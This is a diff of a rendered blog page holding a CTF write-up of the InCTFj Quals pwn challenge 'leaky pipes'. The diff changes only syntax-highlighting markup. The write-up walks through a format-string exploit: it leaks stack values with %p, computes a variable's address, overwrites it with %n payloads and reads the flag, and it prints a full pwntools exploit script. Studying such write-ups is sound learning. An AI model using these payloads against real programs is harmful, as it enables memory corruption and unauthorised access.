@@ -1,4 +1,4 @@
-I"’M<h3 id="intro">Intro:</h3>
+I"¿Q<h3 id="intro">Intro:</h3>
 <p>Played InCTFj Quals this winter vacation. It was a fun filled ctf. Here we will discuss the pwn challenge called <code class="language-plaintext highlighter-rouge">leaky pipes</code>. Make sure to give the challenge a try before seeing this.</p>
 
 <h3 id="challenge-file">Challenge file:</h3>
@@ -82,9 +82,9 @@
 <h3 id="format-string-1">Format string 1:</h3>
 
 <p>First I leak the entire stack(useful range) with the help of %p (gives the hexadecimal value of what is in the stack).</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"-%p"</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
-<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="p">)</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-%p</span><span class="sh">"</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>
 </code></pre></div></div>
 <p>Sending many %p with the â€˜-â€˜ acting as a delimiter between all the values leaked from the stack. (easy to split and put them in a list). If we play around with this then we notice that some of the values from the leaked data is similar to the binaryâ€™s address. Checking the VA space, we find that the value leaked from the %p was indeed from the binary. (underlined)</p>
 
@@ -98,8 +98,8 @@
 
 <p>Pick one of the address that you like which is in the range of the binary and calculate the offset between this address and the bal variable. I took the 21st index as the leak and calculate the offset between bal and leak(10974).</p>
 
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">baladd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">21</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">10974</span>
-<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"bal address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">baladd</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">baladd</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">21</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">10974</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">bal address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">baladd</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 </code></pre></div></div>
 
 <h3 id="format-string-2">Format string 2:</h3>
@@ -123,7 +123,7 @@ I call the leak function and give the string to overwrite the bal variable.</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>%[pad]c%[number]$n - would write that many `pad` of padding at the 9th offset in the leaked value.
 </code></pre></div></div>
 
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"%99c%9$n%90c%9$n%11c%9$n"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">baladd</span><span class="p">))</span> <span class="c1">#(c = character, $n = to write)
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">%99c%9$n%90c%9$n%11c%9$n</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">baladd</span><span class="p">))</span> <span class="c1">#(c = character, $n = to write)
 </span></code></pre></div></div>
 
 <p>Above I have added (99+90+11) which gives 200 into 9th offset since the <code class="language-plaintext highlighter-rouge">p64(baladd)</code> will place the address of baladd in the 9th index from start.</p>
@@ -133,69 +133,69 @@ I call the leak function and give the string to overwrite the bal variable.</p>
 
 <h3 id="full-exploit-script">Full Exploit Script:</h3>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">'x86'</span><span class="p">)</span>
-<span class="n">exe</span> <span class="o">=</span> <span class="s">'./chall'</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./chall"</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="nf">update</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="sh">'</span><span class="s">x86</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">exe</span> <span class="o">=</span> <span class="sh">'</span><span class="s">./chall</span><span class="sh">'</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">"</span><span class="s">./chall</span><span class="sh">"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
-    <span class="s">'''Start the exploit against the target.'''</span>
+    <span class="sh">'''</span><span class="s">Start the exploit against the target.</span><span class="sh">'''</span>
     <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">GDB</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">debug</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
+        <span class="k">return</span> <span class="nf">process</span><span class="p">([</span><span class="n">exe</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
 
-<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
 continue
-'''</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
+</span><span class="sh">'''</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="nf">locals</span><span class="p">())</span>
 
 <span class="c1">#===========================================================
 #                    EXPLOIT GOES HERE
 #===========================================================
 </span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">start</span><span class="p">()</span>
 <span class="c1"># p = remote("gc1.eng.run", 32309)
 </span>
 <span class="c1">#Leaking the bal variable address
-</span><span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+</span><span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"like to check your leaks?"</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"-%p"</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
-<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">like to check your leaks?</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-%p</span><span class="sh">"</span><span class="o">*</span><span class="mi">50</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
+<span class="n">leak</span> <span class="o">=</span> <span class="n">leak</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>
 
-<span class="n">baladd</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">21</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">10974</span>
-<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"bal address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">baladd</span><span class="p">)</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">baladd</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">leak</span><span class="p">[</span><span class="mi">21</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">10974</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">bal address: </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">baladd</span><span class="p">)</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
 <span class="c1">#Over write bal with 200 to bypass the check
-</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"%99c%9$n%90c%9$n%11c%9$n"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">baladd</span><span class="p">))</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">%99c%9$n%90c%9$n%11c%9$n</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">baladd</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recv</span><span class="p">()</span>
 
 <span class="c1">#Leak the flag from the stack since its opened
-</span><span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"feedback!"</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p"</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+</span><span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">3</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">feedback!</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">%16$p-%17$p-%18$p-%19$p-%20$p-%21$p-%22$p</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
 
 <span class="c1">#Change the hex flag to ascii
-</span><span class="n">flag</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="p">)</span>
-<span class="n">final</span> <span class="o">=</span> <span class="s">""</span>
+</span><span class="n">flag</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">-</span><span class="sh">"</span><span class="p">)</span>
+<span class="n">final</span> <span class="o">=</span> <span class="sh">""</span>
 
 <span class="k">for</span> <span class="n">hexval</span> <span class="ow">in</span> <span class="n">flag</span><span class="p">:</span>
     <span class="k">try</span><span class="p">:</span>
-        <span class="n">final</span> <span class="o">+=</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">hexval</span><span class="p">)[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
+        <span class="n">final</span> <span class="o">+=</span> <span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nb">bytes</span><span class="p">.</span><span class="nf">fromhex</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">hexval</span><span class="p">)[</span><span class="mi">4</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]).</span><span class="nf">decode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">))[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
     <span class="k">except</span><span class="p">:</span>
         <span class="k">continue</span>
 
-<span class="n">final</span> <span class="o">+=</span> <span class="s">"ng!!}"</span>
-<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s">"flag: </span><span class="si">{</span><span class="n">final</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+<span class="n">final</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">ng!!}</span><span class="sh">"</span>
+<span class="n">log</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">flag: </span><span class="si">{</span><span class="n">final</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 <p><img src="/assets/leakyinctfj/ss6.png" alt="" /></p>
 
